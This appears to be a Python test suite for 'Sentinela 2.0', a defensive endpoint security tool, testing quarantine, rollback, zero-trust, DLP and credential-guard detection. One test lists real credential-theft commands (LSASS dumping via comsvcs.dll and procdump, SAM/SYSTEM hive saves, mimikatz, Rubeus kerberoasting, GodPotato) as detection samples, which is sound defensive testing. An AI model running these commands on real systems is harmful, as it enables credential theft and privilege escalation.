# test_suite.py
"""Suite de Testes Automatizados para validação do Sentinela 2.0."""
import os
import sys
import unittest
import json
import tempfile
import shutil

# Ensure UTF-8 output on Windows
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

from sentinel_core.logger import SecurityEventLogger
from sentinel_core.crypto_vault import CryptoVault
from sentinel_core.threat_detector import ThreatDetector
from sentinel_core.auto_response import AutoResponseEngine
from sentinel_core.fim import FileIntegrityMonitor
from sentinel_core.ai_anomaly_detector import AIAnomalyDetector
from sentinel_core.ai_predictor import ZeroDayAIPredictor
from sentinel_core.anti_ransomware_rollback import AntiRansomwareRollback
from sentinel_core.yara_pe_analyzer import AdvancedPEAnalyzer
from sentinel_core.post_quantum_shield import PostQuantumShield
from sentinel_core.zero_trust_wfp import ZeroTrustNetworkEngine
from sentinel_core.ueba_graph_engine import UEBAGraphEngine
from sentinel_core.firewall_manager import OSFirewallManager
from sentinel_core.identity_credential_guard import IdentityCredentialGuard
from sentinel_core.dlp_exfiltration_guard import DLPExfiltrationGuard, DLPPatternMatcher
from sentinel_core.execution_anti_exploit_guard import ExecutionAntiExploitGuard
from sentinel_core.network_perimeter_guard import NetworkPerimeterGuard
from sentinel_core.posture_persistence_guard import PosturePersistenceGuard
from sentinel_api import app

class TestSentinelaCore(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")
        self.protected_dir = os.path.join(self.temp_dir, "protected")
        self.vault_dir = os.path.join(self.temp_dir, "vault")

        os.makedirs(self.protected_dir, exist_ok=True)
        os.makedirs(self.vault_dir, exist_ok=True)

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.threat_detector = ThreatDetector(self.logger)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.rollback = AntiRansomwareRollback(self.protected_dir, self.vault_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_logger_and_stats(self):
        eid = self.logger.log_event("HIGH", "MALWARE", "test_file.exe", "Threat detected")
        self.assertGreater(eid, 0)
        
        stats = self.logger.get_stats()
        self.assertEqual(stats["total_events"], 1)
        self.assertEqual(stats["by_severity"].get("HIGH"), 1)
        
        # Test alias
        counts = self.logger.get_event_counts()
        self.assertEqual(counts["total_events"], 1)

    def test_threat_detector_and_aliases(self):
        dummy_file = os.path.join(self.temp_dir, "clean_file.txt")
        with open(dummy_file, "w") as f:
            f.write("Clean file content")
        
        res1 = self.threat_detector.scan_file(dummy_file)
        self.assertEqual(res1["status"], "CLEAN")

        # Test analyze_file and inspect_file aliases
        res2 = self.threat_detector.analyze_file(dummy_file)
        self.assertEqual(res2["status"], "CLEAN")

    def test_quarantine_isolation_and_restore(self):
        mal_file = os.path.join(self.temp_dir, "sample_suspicious.txt")
        with open(mal_file, "w") as f:
            f.write("Suspicious script payload content")

        isolated = self.soar.isolate_file(mal_file)
        self.assertTrue(isolated)
        self.assertFalse(os.path.exists(mal_file))

        items = self.soar.list_quarantine()
        self.assertEqual(len(items), 1)

        # Restore file
        success, restored_path = self.soar.restore_file(items[0]["name"])
        self.assertTrue(success)
        self.assertIsNotNone(restored_path)
        self.assertTrue(os.path.exists(restored_path))

        with open(restored_path, "r") as f:
            content = f.read()
        self.assertEqual(content, "Suspicious script payload content")

    def test_anti_ransomware_rollback(self):
        doc_file = os.path.join(self.protected_dir, "business_plan.docx")
        with open(doc_file, "w") as f:
            f.write("Important enterprise document")

        snap_id = self.rollback.create_snapshot()
        self.assertTrue(snap_id.startswith("snapshot_"))

        # Simulate ransomware corruption
        with open(doc_file, "w") as f:
            f.write("ENCRYPTED_BY_RANSOMWARE_LOCKBIT")

        # Execute 1-click rollback
        restored = self.rollback.rollback_1click(snap_id)
        self.assertTrue(restored)

        with open(doc_file, "r") as f:
            restored_content = f.read()
        self.assertEqual(restored_content, "Important enterprise document")

    def test_post_quantum_shield(self):
        pqc = PostQuantumShield(agent_id="TEST-NODE-01")
        cmd = {"action": "ISOLATE_HOST", "target_ip": "185.220.101.5"}
        sig = pqc.sign_soar_command(cmd)
        self.assertTrue(sig.startswith("PQC_DILITHIUM_V1:"))
        self.assertTrue(pqc.verify_command_pqc(cmd, sig))

        # Tampered command should fail
        tampered_cmd = {"action": "ISOLATE_HOST", "target_ip": "1.1.1.1"}
        self.assertFalse(pqc.verify_command_pqc(tampered_cmd, sig))

    def test_pe_shannon_entropy(self):
        entropy_low = AdvancedPEAnalyzer.calculate_entropy(b"AAAAAAAAAAAAAAAAAAAA")
        self.assertEqual(entropy_low, 0.0)

        entropy_high = AdvancedPEAnalyzer.calculate_entropy(bytes(range(256)))
        self.assertGreater(entropy_high, 7.5)

    def test_zero_trust_lateral_block(self):
        zt = ZeroTrustNetworkEngine()
        res = zt.inspect_packet("192.168.1.10", "192.168.1.20", 445, "powershell.exe")
        self.assertEqual(res["action"], "BLOCK")

    def test_ueba_anomaly(self):
        ueba = UEBAGraphEngine()
        # Guilherme normal hour is 8-19, 3 AM with 40 files is anomaly
        res = ueba.evaluate_user_activity("guilherme", files_accessed_count=40, current_hour=3)
        self.assertIn(res["severity"], ["ALTO", "CRÍTICO"])

    def test_flask_api_endpoints(self):
        client = app.test_client()

        # Health
        res = client.get("/api/health")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data["status"], "ONLINE")

        # Status
        res = client.get("/api/status")
        self.assertEqual(res.status_code, 200)

        # Stats
        res = client.get("/api/stats")
        self.assertEqual(res.status_code, 200)

        # Threat map
        res = client.get("/api/threat_map")
        self.assertEqual(res.status_code, 200)

        # Rollback list
        res = client.get("/api/rollback/list")
        self.assertEqual(res.status_code, 200)

        # ZTNA CARTA Status
        res = client.get("/api/ztna/status")
        self.assertEqual(res.status_code, 200)
        data_ztna = res.get_json()
        self.assertIn("trust_tier", data_ztna)

    def test_ztna_carta_engine(self):
        from sentinel_core.ztna_engine import ZTNACARTAEngine
        ztna = ZTNACARTAEngine()
        self.assertEqual(ztna.trust_tier, "TRUSTED")
        self.assertEqual(ztna.current_risk_score, 0.0)

        # 1. Evento de 35 pts -> Postura MONITORED (faixa 26-55)
        ztna.record_threat_event("EDR_INCIDENT", severity="HIGH")
        self.assertEqual(ztna.trust_tier, "MONITORED")
        self.assertEqual(ztna.current_risk_score, 35.0)

        # 2. Evento crítico (+50 pts) -> Estouro de métrica (85 >= 80) -> HOST_QUARANTINED
        ztna.record_threat_event("CANARY_TRIPWIRE", severity="CRITICAL")
        self.assertGreaterEqual(ztna.current_risk_score, 80.0)
        self.assertEqual(ztna.trust_tier, "HOST_QUARANTINED")
        self.assertTrue(ztna.is_host_isolated)

        # 3. Reset de postura e restauração de isolamento
        ztna.reset_risk_posture()
        self.assertEqual(ztna.current_risk_score, 0.0)
        self.assertEqual(ztna.trust_tier, "TRUSTED")
        self.assertFalse(ztna.is_host_isolated)

    def test_sentinela_orchestrator(self):
        from sentinel_core.sentinela_orchestrator import SentinelaOrchestrator, SecurityEvent
        from sentinel_core.ztna_engine import ZTNACARTAEngine

        ztna = ZTNACARTAEngine()
        orchestrator = SentinelaOrchestrator(ztna_engine=ztna)

        handled_events = []
        def on_custom_event(event, context):
            handled_events.append(event.event_id)

        orchestrator.register_handler("CUSTOM_SENSOR", on_custom_event)

        event = SecurityEvent(source="CUSTOM_SENSOR", severity="HIGH", data={"alert": "Test Alert"})
        orchestrator.emit(event)

        self.assertIn(event.event_id, handled_events)
        self.assertGreater(orchestrator.context.risk_score, 0.0)

class TestAPIEndpointsAndLinks(unittest.TestCase):
    """Valida os links entre o Dashboard (frontend) e a API REST (backend).

    Garante que todos os endpoints consumidos pelo dashboard.html respondam
    corretamente e devolvam o contrato JSON esperado pelo frontend.
    """

    @classmethod
    def setUpClass(cls):
        from sentinel_api import app, init_api
        cls.client = app.test_client()
        # Re-injeta as instâncias default (o init_api vazio é idempotente)
        init_api()

    def test_01_static_links_and_assets(self):
        """Links estáticos do dashboard: '/', '/dashboard', favicon e assets."""
        for url in ("/", "/dashboard"):
            res = self.client.get(url)
            self.assertEqual(res.status_code, 200, f"Falha em {url}")
            self.assertIn(b"SENTINEL", res.data)

        res = self.client.get("/favicon.ico")
        self.assertEqual(res.status_code, 200)

        res = self.client.get("/assets/sentinel_logo.png")
        self.assertEqual(res.status_code, 200)

    def test_02_health_and_status_contract(self):
        """Contrato dos endpoints de health e status usados pelo fetchStatus()."""
        res = self.client.get("/api/health")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data["status"], "ONLINE")
        self.assertIn("version", data)

        res = self.client.get("/api/status")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        for key in ("status", "shield", "firewall", "canary", "tarpit",
                    "threat_intel", "nids_active", "honeypot_active"):
            self.assertIn(key, data, f"Chave '{key}' ausente em /api/status")

    def test_03_stats_threat_map_and_warroom(self):
        """Endpoints de métricas e mapa de ameaças usados pelo dashboard."""
        res = self.client.get("/api/stats")
        self.assertEqual(res.status_code, 200)
        self.assertIn("total_events", res.get_json())

        res = self.client.get("/api/threat_map")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("threats", data)
        self.assertGreater(len(data["threats"]), 0)
        for threat in data["threats"][:3]:
            for key in ("ip", "lat", "lon", "country", "severity"):
                self.assertIn(key, threat, f"Chave '{key}' ausente no threat")

        res = self.client.get("/api/warroom")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("live_attacks", data)
        self.assertIn("total_threats_blocked", data)

    def test_04_logs_and_filters(self):
        """Endpoint de logs com filtros e opções dos seletores do frontend."""
        res = self.client.get("/api/logs?limit=10")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("events", data)
        self.assertIn("count", data)

        res = self.client.get("/api/logs?severity=INFO&limit=5")
        self.assertEqual(res.status_code, 200)

        res = self.client.get("/api/logs/filters")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        for key in ("categories", "dates", "severities"):
            self.assertIn(key, data)

    def test_05_intrusion_sensors(self):
        """Sensor grid do dashboard: /api/intrusion/sensors."""
        res = self.client.get("/api/intrusion/sensors")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("sensors", data)
        self.assertGreaterEqual(data.get("total_sensors", 0), 10)
        for sensor in data["sensors"]:
            for key in ("id", "name", "status", "active", "icon"):
                self.assertIn(key, sensor, f"Chave '{key}' ausente no sensor")

    def test_06_shield_config_roundtrip(self):
        """Toggle do escudo: POST + GET em /api/config/shield."""
        res = self.client.post("/api/config/shield", json={"inbound": True, "outbound": True})
        self.assertEqual(res.status_code, 200)
        res = self.client.get("/api/config/shield")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        self.assertIn("config", data)

    def test_07_rollback_flow_snapshot_list_restore(self):
        """Fluxo completo do modal Rollback: snapshot -> list -> restore."""
        res = self.client.post("/api/rollback/snapshot")
        self.assertEqual(res.status_code, 200)
        snap_id = res.get_json().get("snapshot_id")
        self.assertTrue(snap_id and snap_id.startswith("snapshot_"))

        res = self.client.get("/api/rollback/list")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn(snap_id, data.get("snapshots", []))

        res = self.client.post("/api/rollback/restore", json={"snapshot_id": snap_id})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "success")

    def test_08_mitre_and_honeytokens(self):
        """Matriz MITRE ATT&CK e status de honeytokens."""
        res = self.client.get("/api/mitre/matrix")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("matrix", data)
        self.assertGreater(data.get("total_techniques", 0), 0)

        res = self.client.get("/api/honeytokens/status")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        for key in ("total_baits", "baits", "bait_dir"):
            self.assertIn(key, data)

    def test_09_etw_simulation(self):
        """Simulação de telemetria ETW (3 tipos)."""
        for sim_type in ("process_injection", "registry_persistence", "sysmon_network"):
            res = self.client.post("/api/etw/simulate", json={"type": sim_type})
            self.assertEqual(res.status_code, 200, f"Falha no tipo {sim_type}")

    def test_10_quarantine_flow_via_api(self):
        """Fluxo completo de quarentena via API: isolate -> list -> restore."""
        import tempfile
        import os as _os

        fd, path = tempfile.mkstemp(suffix=".txt", dir=_os.getcwd())
        with _os.fdopen(fd, "w") as f:
            f.write("conteudo para quarentena via teste")

        try:
            res = self.client.post("/api/quarantine", json={"file_path": path})
            self.assertEqual(res.status_code, 200)
            self.assertEqual(res.get_json().get("status"), "SUCCESS")

            res = self.client.get("/api/quarantine/list")
            self.assertEqual(res.status_code, 200)
            items = res.get_json().get("quarantine", [])
            self.assertGreaterEqual(len(items), 1)
            quarantined_name = items[0]["name"]

            res = self.client.post("/api/quarantine/restore", json={"file_name": quarantined_name})
            self.assertEqual(res.status_code, 200)
            self.assertEqual(res.get_json().get("status"), "SUCCESS")
        finally:
            if _os.path.exists(path):
                _os.remove(path)

    def test_11_ztna_full_cycle(self):
        """Ciclo ZTNA: evaluate -> isolate -> restore -> reset."""
        res = self.client.post("/api/ztna/evaluate",
                               json={"event_type": "EDR_INCIDENT", "severity": "HIGH"})
        self.assertEqual(res.status_code, 200)
        self.assertIn("trust_tier", res.get_json())

        res = self.client.post("/api/ztna/isolate", json={"reason": "Teste automatizado"})
        self.assertEqual(res.status_code, 200)

        res = self.client.post("/api/ztna/restore")
        self.assertEqual(res.status_code, 200)

        res = self.client.post("/api/ztna/reset")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("trust_tier"), "TRUSTED")

    def test_12_zerotrust_ueba_memory_ai(self):
        """Endpoints avançados: WFP inspect, UEBA, memória e IA preditiva."""
        res = self.client.post("/api/zerotrust/inspect", json={
            "src_ip": "192.168.1.55", "dst_ip": "192.168.1.100",
            "dst_port": 445, "process_name": "powershell.exe"})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json()["result"]["action"], "BLOCK")

        res = self.client.post("/api/ueba/evaluate",
                               json={"username": "guilherme", "files_accessed": 40, "current_hour": 3})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "success")

        res = self.client.post("/api/memory/scan", json={"pid": 4120, "type": "cobalt_strike"})
        self.assertEqual(res.status_code, 200)
        self.assertIn("analysis", res.get_json())

        res = self.client.post("/api/ai/predict",
                               json={"ip": "185.220.101.5", "payload": "x" * 64, "request_rate": 15})
        self.assertEqual(res.status_code, 200)

    def test_13_cti_pqc_canary_and_misc(self):
        """CTI sync, PQC sign, canary setup, whitelist e firewall block/unblock."""
        res = self.client.post("/api/cti/sync")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "success")

        res = self.client.post("/api/pqc/sign", json={"command": {"action": "TEST"}})
        self.assertEqual(res.status_code, 200)
        self.assertTrue(res.get_json().get("dilithium_signature", "").startswith("PQC_DILITHIUM_V1:"))

        res = self.client.post("/api/canary/setup")
        self.assertEqual(res.status_code, 200)

        res = self.client.post("/api/whitelist/add", json={"path": "arquivo_seguro_teste.txt"})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "SUCCESS")

        test_ip = "198.51.100.77"
        res = self.client.post("/api/firewall/block", json={"ip": test_ip, "reason": "Teste automatizado"})
        self.assertEqual(res.status_code, 200)

        res = self.client.post("/api/firewall/unblock", json={"ip": test_ip})
        self.assertEqual(res.status_code, 200)

    def test_14_diagnostics_audit_and_terms(self):
        """Auditoria geral de proteções, termos de uso e scan sob demanda."""
        res = self.client.get("/api/protection/diagnostics")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("system_status"), "TOTALMENTE_BLINDADO")
        self.assertGreaterEqual(data.get("total_subsystems", 0), 14)

        res = self.client.get("/api/system/audit")
        self.assertEqual(res.status_code, 200)

        res = self.client.get("/api/terms")
        self.assertEqual(res.status_code, 200)
        self.assertIn("terms", res.get_json())

        res = self.client.post("/api/scan_now")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "SUCCESS")

    def test_15_init_api_injection_contract(self):
        """init_api deve aceitar vault e ai_detector (contrato do service)."""
        from sentinel_api import init_api
        # Não deve lançar TypeError para kwargs usados pelo sentinela_service.py
        try:
            init_api(vault=None, ai_detector=None, ztna_engine=None)
        except TypeError as e:
            self.fail(f"init_api rejeitou o contrato do service: {e}")

    def test_16_system_resources_endpoint(self):
        """Novo endpoint de telemetria de recursos do host usado pelo painel do Dashboard."""
        res = self.client.get("/api/system/resources")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        for key in ("cpu_percent", "memory_percent", "disk_percent", "process_count",
                    "memory_used_mb", "memory_total_mb", "net_sent_mb", "net_recv_mb"):
            self.assertIn(key, data, f"chave ausente no payload de recursos: {key}")
        self.assertGreaterEqual(data["memory_total_mb"], 0)

    def test_17_scan_file_and_dashboard_surface(self):
        """Varredura de arquivo sob demanda + elementos do novo painel do Dashboard."""
        import os as _os
        base = _os.path.dirname(_os.path.abspath(__file__))
        res = self.client.post("/api/scan_file", json={"file_path": _os.path.join(base, "main.py")})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "CLEAN")

        # Elementos visíveis do novo painel de Telemetria + Varredura sob demanda
        html = open(_os.path.join(base, "dashboard.html"), encoding="utf-8").read()
        for element_id in ("sysCpuBar", "sysMemBar", "sysDiskBar", "hostUptimeLabel",
                           "inputScanFilePath", "scanFileResult"):
            self.assertIn(f'id="{element_id}"', html, f"elemento do painel ausente no dashboard: {element_id}")

        # O JS do dashboard deve consumir o novo endpoint
        self.assertIn("fetchSystemResources()", html)
        self.assertIn("fetch('/api/system/resources')", html)
        self.assertIn("scanFileNow()", html)
        self.assertIn("whitelistEnteredPath()", html)


class TestFunctionsEngineAPI(unittest.TestCase):
    """Testes dos endpoints do Functions Engine (100+ funções estilo Zabbix)."""

    def setUp(self):
        self.client = app.test_client()

    def test_01_functions_status_and_list(self):
        res = self.client.get("/api/functions/status")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        self.assertGreaterEqual(data.get("total_functions", 0), 50)
        self.assertGreaterEqual(len(data.get("categories", [])), 5)

        res = self.client.get("/api/functions/list")
        data = res.get_json()
        self.assertEqual(len(data.get("functions", [])), data.get("count"))
        self.assertGreaterEqual(data.get("count", 0), 50)

    def test_02_functions_demo_evaluate_and_trigger(self):
        res = self.client.post("/api/functions/metrics/demo")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "success")

        res = self.client.post("/api/functions/evaluate", json={"expression": 'last("system.cpu.util")'})
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        self.assertEqual(data.get("result"), 95)

        res = self.client.post("/api/functions/trigger", json={"expression": 'last("system.cpu.util") > 90'})
        self.assertEqual(res.status_code, 200)
        self.assertTrue(res.get_json().get("fired"))

        res = self.client.post("/api/functions/evaluate", json={"expression": 'funcao_inexistente("x")'})
        self.assertEqual(res.status_code, 400)
        self.assertIn("error", res.get_json())

    def test_03_functions_ingest_items_clear(self):
        res = self.client.post("/api/functions/ingest", json={"item_id": "test.metric", "value": 42})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("ingested"), 1)

        res = self.client.post("/api/functions/evaluate", json={"expression": 'last("test.metric")'})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("result"), 42)

        res = self.client.get("/api/functions/items?limit=10")
        self.assertEqual(res.status_code, 200)
        self.assertGreaterEqual(res.get_json().get("count", 0), 1)

        res = self.client.post("/api/functions/clear")
        self.assertEqual(res.status_code, 200)
        self.assertGreaterEqual(res.get_json().get("cleared", 0), 1)


class TestIdentityCredentialGuard(unittest.TestCase):
    """Suite de testes para o motor de Proteção de Identidade e Credenciais (LSASS Armor & PrivEsc Guard)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.guard = IdentityCredentialGuard(logger=self.logger, soar=self.soar)
        self.client = app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_rules_and_mitre_coverage(self):
        """Valida se as regras cobrem as principais técnicas MITRE de roubo de credenciais."""
        status = self.guard.get_status()
        self.assertEqual(status["status"], "ACTIVE_DEFENSE")
        self.assertGreaterEqual(status["rules_loaded"], 15)

        mitre_techniques = {r["mitre"] for r in self.guard.CREDENTIAL_THEFT_RULES}
        self.assertIn("T1003.001", mitre_techniques)  # LSASS Memory Dumping
        self.assertIn("T1003.002", mitre_techniques)  # SAM Hive Extraction
        self.assertIn("T1134", mitre_techniques)      # Token Impersonation / Potato
        self.assertIn("T1558", mitre_techniques)      # Kerberoasting

    def test_02_lsass_handle_inspection(self):
        """Valida se tentativas de abrir LSASS com permissões perigosas são bloqueadas."""
        # Tentativa de leitura de VM (Dumping)
        is_threat = self.guard.inspect_lsass_handle_access(caller_pid=99999, access_mask=IdentityCredentialGuard.PROCESS_VM_READ)
        self.assertTrue(is_threat)

        # Tentativa com PROCESS_ALL_ACCESS
        is_threat_all = self.guard.inspect_lsass_handle_access(caller_pid=99999, access_mask=IdentityCredentialGuard.PROCESS_ALL_ACCESS)
        self.assertTrue(is_threat_all)

        # Permissão benigna sem leitura/modificação de memória
        is_threat_benign = self.guard.inspect_lsass_handle_access(caller_pid=99999, access_mask=0x0001)
        self.assertFalse(is_threat_benign)

    def test_03_heuristic_signatures_matching(self):
        """Valida correspondência das assinaturas com comandos reais de invasores."""
        sample_malicious_commands = [
            ("rundll32.exe C:\\windows\\System32\\comsvcs.dll, #24 640 full", "ID_LSASS_COMSVCS_ORDINAL"),
            ("procdump.exe -ma lsass.exe lsass.dmp", "ID_LSASS_PROCDUMP"),
            ("reg.exe save HKLM\\SAM C:\\temp\\sam.save", "ID_REG_SAVE_SAM"),
            ("reg save HKLM\\SYSTEM C:\\temp\\sys.save", "ID_REG_SAVE_SYSTEM"),
            ("esentutl.exe /y /vss C:\\Windows\\System32\\config\\SAM", "ID_ESENTUTL_VSS_SAM"),
            ("GodPotato-NET4.exe -cmd \"whoami\"", "ID_POTATO_EXPLOIT_FAMILY"),
            ("Rubeus.exe kerberoast /outfile:hashes.txt", "ID_RUBEUS_KERBEROS_ROAST"),
            ("mimikatz.exe \"sekurlsa::logonpasswords\" exit", "ID_MIMIKATZ_SEKURLSA")
        ]

        for cmd, expected_rule in sample_malicious_commands:
            matched = False
            cmd_lower = cmd.lower()
            for rule in self.guard.CREDENTIAL_THEFT_RULES:
                keywords = rule["keywords"]
                mode = rule.get("match_mode", "all")
                matched_rule = any(kw in cmd_lower for kw in keywords) if mode == "any" else all(kw in cmd_lower for kw in keywords)
                if matched_rule:
                    self.assertEqual(rule["id"], expected_rule, f"Falha na regra para: {cmd}")
                    matched = True
                    break
            self.assertTrue(matched, f"Comando não foi detectado pelas regras: {cmd}")

    def test_04_token_privilege_audit(self):
        """Valida que o método de auditoria de tokens executa com integridade."""
        suspicious = self.guard.audit_token_privileges()
        self.assertIsInstance(suspicious, list)

    def test_05_api_identity_guard_endpoints(self):
        """Valida a disponibilidade e respostas dos endpoints REST da API."""
        # 1. Status
        res = self.client.get("/api/identity-guard/status")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "ACTIVE_DEFENSE")

        # 2. Varredura sob demanda
        res_scan = self.client.post("/api/identity-guard/scan")
        self.assertEqual(res_scan.status_code, 200)
        scan_data = res_scan.get_json()
        self.assertEqual(scan_data.get("status"), "success")
        self.assertIn("threats_found_count", scan_data)

        # 3. Auditoria de privilégios de tokens
        res_priv = self.client.post("/api/identity-guard/audit-privileges")
        self.assertEqual(res_priv.status_code, 200)
        priv_data = res_priv.get_json()
        self.assertEqual(priv_data.get("status"), "success")

        # 4. Histórico de ameaças
        res_threats = self.client.get("/api/identity-guard/threats")
        self.assertEqual(res_threats.status_code, 200)
        self.assertEqual(res_threats.get_json().get("status"), "success")


class TestDLPExfiltrationGuard(unittest.TestCase):
    """Suite de testes para o motor de Proteção contra Perda de Dados e Exfiltração (DLP & USB Armor)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.dlp = DLPExfiltrationGuard(logger=self.logger, soar=self.soar)
        self.client = app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_cpf_and_cnpj_validation(self):
        """Valida precisão do cálculo de dígito verificador Módulo 11 para CPFs e CNPJs."""
        # CPF válido conhecido
        valid_cpf = "529.982.247-25"
        self.assertTrue(DLPPatternMatcher.validate_cpf(valid_cpf))

        # CPFs inválidos (dígito errado e dígitos repetidos)
        self.assertFalse(DLPPatternMatcher.validate_cpf("111.111.111-11"))
        self.assertFalse(DLPPatternMatcher.validate_cpf("123.456.789-00"))

        # CNPJ válido
        valid_cnpj = "11.222.333/0001-81"
        self.assertTrue(DLPPatternMatcher.validate_cnpj(valid_cnpj))
        self.assertFalse(DLPPatternMatcher.validate_cnpj("00.000.000/0000-00"))
        self.assertFalse(DLPPatternMatcher.validate_cnpj("11.222.333/0001-99"))

    def test_02_luhn_credit_card_validation(self):
        """Valida que cartões de crédito são filtrados rigorosamente via Algoritmo de Luhn."""
        valid_visa = "4532 0151 1283 0366"
        self.assertTrue(DLPPatternMatcher.validate_luhn(valid_visa))

        # Sequência repetida ou dígito inválido
        self.assertFalse(DLPPatternMatcher.validate_luhn("0000 0000 0000 0000"))
        self.assertFalse(DLPPatternMatcher.validate_luhn("4532 0151 1283 0367"))

    def test_03_deep_content_secrets_inspection(self):
        """Valida detecção simultânea de credenciais de infraestrutura e PII em texto."""
        sample_leak_text = """
        Confidential Deployment Script
        AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
        PRIVATE_KEY: -----BEGIN RSA PRIVATE KEY-----
        MIIEowIBAAKCAQEA0Y...
        -----END RSA PRIVATE KEY-----
        DATABASE_URL = "postgres://admin:SecretPassword123@db.internal:5432/corp"
        Client CPF: 529.982.247-25
        Credit Card: 4532-0151-1283-0366
        """

        report = self.dlp.inspect_text(sample_leak_text)
        self.assertEqual(report["status"], "SENSITIVE_DATA_DETECTED")
        self.assertGreaterEqual(report["findings_count"], 4)

        types_found = {f["type"] for f in report["findings"]}
        self.assertIn("AWS_CREDENTIAL", types_found)
        self.assertIn("PRIVATE_KEY", types_found)
        self.assertIn("BRAZILIAN_CPF", types_found)
        self.assertIn("CREDIT_CARD", types_found)

    def test_04_usb_policy_and_audit(self):
        """Valida alternância e auditoria de políticas de mídias removíveis."""
        res_policy = self.dlp.set_usb_policy("READ_ONLY")
        self.assertEqual(res_policy["status"], "SUCCESS")
        self.assertEqual(self.dlp.usb_policy, "READ_ONLY")

        audit = self.dlp.audit_usb_storage()
        self.assertEqual(audit["status"], "success")
        self.assertEqual(audit["usb_policy"], "READ_ONLY")
        self.assertIn("removable_drives_count", audit)

    def test_05_dlp_api_endpoints(self):
        """Valida disponibilidade e respostas dos endpoints REST de DLP."""
        # 1. Status
        res_status = self.client.get("/api/dlp/status")
        self.assertEqual(res_status.status_code, 200)
        data = res_status.get_json()
        self.assertEqual(data.get("status"), "ACTIVE_DEFENSE")
        self.assertIn("usb_policy", data)

        # 2. Inspecionar Texto
        res_inspect = self.client.post("/api/dlp/inspect-text", json={"text": "Client CPF: 529.982.247-25"})
        self.assertEqual(res_inspect.status_code, 200)
        self.assertEqual(res_inspect.get_json().get("status"), "SENSITIVE_DATA_DETECTED")

        # 3. Alterar Política de USB
        res_usb = self.client.post("/api/dlp/usb-policy", json={"policy": "READ_ONLY"})
        self.assertEqual(res_usb.status_code, 200)
        self.assertEqual(res_usb.get_json().get("status"), "SUCCESS")

        # 4. Varredura de Exfiltração
        res_scan = self.client.post("/api/dlp/scan-exfiltration")
        self.assertEqual(res_scan.status_code, 200)
        self.assertEqual(res_scan.get_json().get("status"), "success")

        # 5. Histórico de Eventos DLP
        res_events = self.client.get("/api/dlp/events")
        self.assertEqual(res_events.status_code, 200)
        self.assertEqual(res_events.get_json().get("status"), "success")


class TestExecutionAntiExploitGuard(unittest.TestCase):
    """Suite de testes para o motor de Execução & Anti-Exploit / Anti-Hollowing."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.guard = ExecutionAntiExploitGuard(logger=self.logger, soar=self.soar)
        self.client = app.test_client()

